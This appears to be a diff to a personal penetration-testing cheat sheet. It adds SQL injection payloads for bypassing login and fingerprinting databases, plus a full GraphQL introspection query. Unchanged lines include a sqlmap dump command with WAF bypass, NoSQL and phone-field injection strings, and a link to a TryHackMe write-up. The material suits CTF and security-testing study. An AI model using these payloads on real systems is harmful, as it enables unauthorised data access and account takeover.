@@ -75,8 +75,8 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 --tamper=space2comment #bypass waf
 ```
 
-##### syntaxis
-###### mysql
+## syntaxis
+## mysql
 ```sql
 .tables 										#to see all tables
 PRAGMA table_info(<table>) 		#see information
@@ -87,7 +87,7 @@ use DATABASE;
 show tables
 SELECT * FROM users
 ```
-###### mongodb
+## mongodb
 ```sql
 mongo
 show dbs
@@ -96,6 +96,16 @@ show collections
 db.<collection>.find()
 
 search[$ne]=string #mongodb
+```
+## payloads
+```sql
+username=gfd'+union+select+'password'+--+-&password=password
+
+?id=2 and 'foo' 'bar' = 'foobar'     # mysql
+?id=2 and 'foo'+'bar'='foobar'       # mssql
+?id=2 and substring('foo',1,1) = 'f' # postgresql
+?id=2 and lengthb('foo') = 3         # oracle
+not previous                         # sqlite
 ```
 ---
 # steal cookie
@@ -258,6 +268,100 @@ These are the optional parameters we are interested in. In them you can often wr
 +280505552280;phone-context=sleep(10)
 +280505552280;phone-context={{4*4}}{{6+6}}
 +280505552280;ext=N , where we loop over the value of N and thus bypass the rate-limit.
+```
+# graphql
+- [graphql voyager](https://graphql-kit.com/graphql-voyager/)
+```
+query{__schema{queryType{name}}} # if u can inject => good
+in InQL mutations = do something with data, queries = get data
+```
+## Full introspection query
+```
+query IntrospectionQuery {
+	__schema {
+		queryType {
+			name
+		}
+		mutationType {
+			name
+		}
+		subscriptionType {
+			name
+		}
+		types {
+		 ...FullType
+		}
+		directives {
+			name
+			description
+			args {
+				...InputValue
+		}
+		onOperation  #Often needs to be deleted to run query
+		onFragment   #Often needs to be deleted to run query
+		onField      #Often needs to be deleted to run query
+		}
+	}
+}
+
+fragment FullType on __Type {
+	kind
+	name
+	description
+	fields(includeDeprecated: true) {
+		name
+		description
+		args {
+			...InputValue
+		}
+		type {
+			...TypeRef
+		}
+		isDeprecated
+		deprecationReason
+	}
+	inputFields {
+		...InputValue
+	}
+	interfaces {
+		...TypeRef
+	}
+	enumValues(includeDeprecated: true) {
+		name
+		description
+		isDeprecated
+		deprecationReason
+	}
+	possibleTypes {
+		...TypeRef
+	}
+}
+
+fragment InputValue on __InputValue {
+	name
+	description
+	type {
+		...TypeRef
+	}
+	defaultValue
+}
+
+fragment TypeRef on __Type {
+	kind
+	name
+	ofType {
+		kind
+		name
+		ofType {
+			kind
+			name
+			ofType {
+				kind
+				name
+			}
+		}
+	}
+}
 ```
 # links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
